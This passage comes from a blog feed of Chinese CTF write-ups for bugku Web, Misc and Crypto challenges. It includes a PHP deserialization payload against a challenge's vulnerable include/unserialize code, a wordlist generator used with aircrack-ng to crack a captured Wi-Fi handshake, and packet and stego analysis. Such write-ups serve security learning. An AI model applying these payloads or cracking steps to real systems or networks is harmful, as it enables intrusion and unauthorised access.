bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;  </span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123; </span><br><span class="line">        echo &quot;不能现在就给你flag哦&quot;;</span><br><span class="line">        exit();  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        include($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        echo $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$pass = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); //hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到unserialize就知道想要考察反序列化漏洞<br>从hint.php知道这个类，我们就可以构造一个类然后在echo函数调用后去调用__tostring()函数,然后读取文件<br>这里是我构造的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">          &#125;  </span><br><span class="line"></span><br><span class="line">$a= new Flag();</span><br><span class="line">$a-&gt;file = &apos;flag.php&apos;;</span><br><span class="line">print _r(serialize($a));</span><br></pre></td></tr></table></figure><p>最后另<code>password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>，发包得到flag<br><img src="http://img.blog.csdn.net/20180309222216523?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>有时候不一定构造类，普通的数组也行，最近在实验吧做题遇到了一题直接用数组反序列化的题目。。。还是要看清楚题目要没有给你类之类的</p><h2 id="还没做完有待更新"><a href="#还没做完有待更新" class="headerlink" title="还没做完有待更新"></a>还没做完有待更新</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web2&quot;&gt;&lt;/a&gt;web2&lt;/h2&gt;&lt;p&gt;view-source:查看源码即可&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>bugku Misc write up</title>
    <link href="0verwatch.top/2018/02/14/bugkuMiscwp/"/>
    <id>0verwatch.top/2018/02/14/bugkuMiscwp/</id>
    <published>2018-02-13T16:12:38.000Z</published>
    <updated>2018-05-20T07:17:31.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>直接关注公众号即可，不多说</p><a id="more"></a><h2 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h2><p>打开拉到最后发现Html编码，上python脚本。。。。<br><img src="http://img.blog.csdn.net/20180214000213618?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str2 = &apos;你看到的编码&apos;</span><br><span class="line"></span><br><span class="line">from HTMLParser import HTMLParser</span><br><span class="line">h = HTMLParser() </span><br><span class="line">s2 = h.unescape(str2)</span><br><span class="line">s1 = h.unescape(h.unescape(str2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print s1 </span><br><span class="line">print s2</span><br></pre></td></tr></table></figure></p><p>得到下图，<br><img src="http://img.blog.csdn.net/20180214000309643?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>便猜测是key{you are right}</p><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>打开发现是一张png格式的照片，放进StegSolve没发现啥<br>百度一下原来是改高度<br><img src="http://img.blog.csdn.net/20180214000419272?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>找到IDR片段就是00 00 00 0D开头的，把其中的A4改为F4，得到flag<br><img src="http://img.blog.csdn.net/20180214000407285?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>打开发现是一个数据包，用wireshark打开，查看整个包的信息，可以追踪一下TCP流，发现里面有一个flag<br><img src="http://img.blog.csdn.net/20180214000350745?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="眼见非实"><a href="#眼见非实" class="headerlink" title="眼见非实"></a>眼见非实</h2><p>解压发现是个Word文档，尝试打开打不开，放进winhex里面看是504B0304开头的，一个zip文件，改后缀名再次打开，并在里面的document.xml发现flag<br><img src="http://img.blog.csdn.net/20180214000450567?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="又一张图片，还单纯吗？？"><a href="#又一张图片，还单纯吗？？" class="headerlink" title="又一张图片，还单纯吗？？"></a>又一张图片，还单纯吗？？</h2><p>放进binwalk里跑一下，发现里面还有一张图片分离出来既是flag<br><img src="http://img.blog.csdn.net/20180214000515444?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h2><p>直接百度搜图，某刘姓女明星</p><h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>看到是一个二进制文件，用RoutePassView打开，题目提示是用户名，便寻找用户名<br><img src="http://img.blog.csdn.net/20180214000553921?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>jpg图片上来先一波操作，没看到啥有用的，binwalk一下，发现里面有zip，分离出来，打开一看还是个密码题。。。。3个数的密码<br>看不懂他的提示，然后自己用工具爆破一波，密码是871.。。。。这尼玛跟斗地主有什么关系<br><img src="http://img.blog.csdn.net/2018021400072824?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>解开之后发现里面有一张图片winhex打开最后那里有flag。。。还得Base64一波最后得到flag<br><img src="http://img.blog.csdn.net/2018021400065848?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h2><p>下载下来发现是一个exe文件，又打不开，放进Notepad++看一下，发现这是一个可以转图片的Base64<br>直接转换即可  <a href="http://base64.xpcha.com/" target="_blank" rel="noopener">http://base64.xpcha.com/</a> 是个二维码<br>扫一下获得key<br><img src="http://img.blog.csdn.net/20180214000802528?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>下载下来是一个linux下的压缩包，那就去linux下用tar命令解压缩就行，里面的文件Notepad++打开并搜索关键字key得到flag<br><img src="http://img.blog.csdn.net/20180214000821605?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>感觉下面还有东西，于是就打算改高度，于是发现了flag</p><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>直接解压Notepad++打开搜索key就有了，我不知道这个题说Linux想干嘛。。。。。。</p><h2 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h2><p>解压后的图片属性里面有Base64编码，先解码，没啥意义，然后binwalk一下，发现里面还有加密rar，便猜测刚猜的Base64是密码，解压成功，<br><img src="http://img.blog.csdn.net/20180214001019841?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>又是那个之前改高度的图片，<br>获得flag<br><img src="http://img.blog.csdn.net/20180214001043121?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p>用Audacity打开一看是摩斯密码，直接解密即可，然后直接提交<br><img src="http://img.blog.csdn.net/20180218142017881?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h2><p>第一次碰到这个类型的题目<br>利用了python的PIL库。。。。<br>然后参考了下面的博客<br><a href="https://www.cnblogs.com/webFuckeeeer/p/4536776.html" target="_blank" rel="noopener">https://www.cnblogs.com/webFuckeeeer/p/4536776.html</a><br>结果发现题目好像有点问题。。。。人家都是61366行，我这里只有emmmm。。。。。<br><img src="http://img.blog.csdn.net/20180218142002473?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>而且像素也不完整。。。。。应该是表哥更新之后把题目的文件没有全选完就复制进去了。。<br>我就直接输入别人的flag了</p><h2 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h2><p>用HXD打开找一下jpg的文件尾FFD9，发现后面有大量的16进制数据。。<br><img src="http://img.blog.csdn.net/20180218184148171?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>复制进去用Notepad++的converter功能转换为ASCII发现一大串坐标<br><img src="http://img.blog.csdn.net/20180218184201833?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>用一个叫gunplot(我用的是Windows下的)的画图软件把这些坐标点画出来，先把他们的格式给弄好<br><img src="http://img.blog.csdn.net/20180218184211488?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>然后用plot + 文件名的命令导出文件，再扫一扫即可<br><img src="http://img.blog.csdn.net/20180218184223748?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20180218184237326?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h2><p>常规步骤先binwalk一波，发现里面有一个加密的rar包，找了很久都没找到密码。。。。。<br>发现图片上的字。。。。。。。。可能是密码。。。。尝试一下<br>喜欢我吗.竟然是密码。。。。我去<br>里面有一个txt文件<br><img src="http://img.blog.csdn.net/20180218142032525?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>先解码第一个摩斯密码<br>发现是一个解密网址。。。。。<br><img src="http://img.blog.csdn.net/2018021814204925?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>再解密以下网址后面的base64<br><img src="http://img.blog.csdn.net/20180218142112583?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20180218142123830?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>解密出来发现是一张二维码，扫一下得到flag<br><img src="http://img.blog.csdn.net/20180218142132491?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>这一题可以直接用binwalk把里面的gzip分离出来，那个就是flag<br><img src="https://s1.ax1x.com/2018/02/27/9BsEm6.png" alt="9BsEm6.png"><br><img src="https://s1.ax1x.com/2018/02/27/9BsmkD.png" alt="9BsmkD.png"></p><h2 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>发现从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描，之后可以大致找到攻击机远程连接目标机的包（通过3389端口），以及smb协议的包（用于Web连接和客户端与服务器之间的信息沟通），再往下可以找到以5542开始的包已经getshell<br>追踪TCP流，发现<br><img src="https://s1.ax1x.com/2018/02/27/9BsMpd.png" alt="9BsMpd.png"><br>然后base64即可</p><h2 id="这么多数据包-1"><a href="#这么多数据包-1" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>追踪TCP流，发现</p><p>然后base64即可</p><h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p>先写个脚本把密码跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">import string</span><br><span class="line">attendNum = string.digits</span><br><span class="line">str1 = &apos;1391040&apos;</span><br><span class="line">f = open(&apos;telephone.txt&apos;,&apos;w&apos;)</span><br><span class="line">for i in attendNum:</span><br><span class="line">for j in attendNum:</span><br><span class="line">for k in attendNum:</span><br><span class="line">for l in attendNum:</span><br><span class="line">f.write(str1+i+j+k+l+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后再用aircrack完成即可<br>aircrack-ng.exe wifi.cap -w telephone.txt<br>发现3上面出现握手包，我们就在 index  number of target写3<br>结果出来<br><img src="https://img-blog.csdn.net/20180327210706395?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTEzNzc5OTY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="还没做完，有待更新。。。"><a href="#还没做完，有待更新。。。" class="headerlink" title="还没做完，有待更新。。。"></a>还没做完，有待更新。。。</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;签到题&quot;&gt;&lt;a href=&quot;#签到题&quot; class=&quot;headerlink&quot; title=&quot;签到题&quot;&gt;&lt;/a&gt;签到题&lt;/h2&gt;&lt;p&gt;直接关注公众号即可，不多说&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Misc" scheme="0verwatch.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>bugku Crypto write up</title>
    <link href="0verwatch.top/2018/02/12/bugkuCrypto/"/>
    <id>0verwatch.top/2018/02/12/bugkuCrypto/</id>
    <published>2018-02-12T09:14:24.000Z</published>
    <updated>2018-05-20T06:38:12.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="滴答-滴"><a href="#滴答-滴" class="headerlink" title="滴答~滴"></a>滴答~滴</h2><p>遂一看就知道是摩斯密码，直接摩斯解密，获得密码<br><a id="more"></a></p><h2 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h2><p>根据提示应该是栅栏加密而且是2栏，遂尝试栅栏解密，竖着看就是key<br><img src="http://img.blog.csdn.net/20180212165315824?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h2><p>解密网址:<a href="http://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/</a><br>全都是Ook就尝试Ook解密，得出flag，如图<br><img src="http://img.blog.csdn.net/20180212165402787?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="这不是摩斯密码"><a href="#这不是摩斯密码" class="headerlink" title="这不是摩斯密码"></a>这不是摩斯密码</h2><p>解密网址:<a href="http://tool.bugku.com/brainfuck/" target="_blank" rel="noopener">http://tool.bugku.com/brainfuck/</a><br>brainfuck解码就得到flag</p><h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><p>凯撒解密后发现有一段Base64，然后再来一波base64解码得到flag<br><img src="http://img.blog.csdn.net/20180212165504192?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20180212165707493?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="一段Base64"><a href="#一段Base64" class="headerlink" title="一段Base64"></a>一段Base64</h2><p>把文件下载下来后，第一次base64之后发现是8进制转义序列，直接复制下来利用python中print函数的默认属性打印一波，得到一个16进制转义序列，再用一次print，下面是我解题时的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">'C:/Users/Vinson Chan/Desktop/bs.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">str=f.read()</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##print base64.b64decode(str)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str = [<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">56</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span 